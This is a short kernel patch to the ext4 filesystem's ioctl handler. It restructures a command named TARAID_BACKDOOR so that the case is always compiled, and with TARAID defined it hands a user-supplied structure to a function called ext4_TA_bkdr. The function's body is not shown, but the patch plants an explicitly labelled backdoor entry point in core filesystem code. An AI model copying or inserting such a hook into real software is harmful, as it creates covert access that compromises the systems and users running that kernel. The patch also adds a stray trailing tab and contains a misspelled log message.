@@ -917,7 +917,7 @@ static long __ext4_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
 	struct user_namespace *mnt_userns = file_mnt_user_ns(filp);
 
 	ext4_debug("cmd = %u, arg = %lu\n", cmd, arg);
-
+	
 	switch (cmd) {
 	case FS_IOC_GETFSMAP:
 		return ext4_ioc_getfsmap(sb, (void __user *)arg);
@@ -1056,12 +1056,14 @@ mext_out:
 		fdput(donor);
 		return err;
 	}
-
+	case TARAID_BACKDOOR: {
 #ifdef TARAID
-	case TARAID_BACKDOOR:
 		return ext4_TA_bkdr(inode,(struct TA_backdoor*)arg);
-
+#else
+		printk(KERN_INFO"TARAID_BACKDOOR without TARAID defination\n");
+		return 0;
 #endif
+	}
 
 	case EXT4_IOC_GROUP_ADD: {
 		struct ext4_new_group_data input;
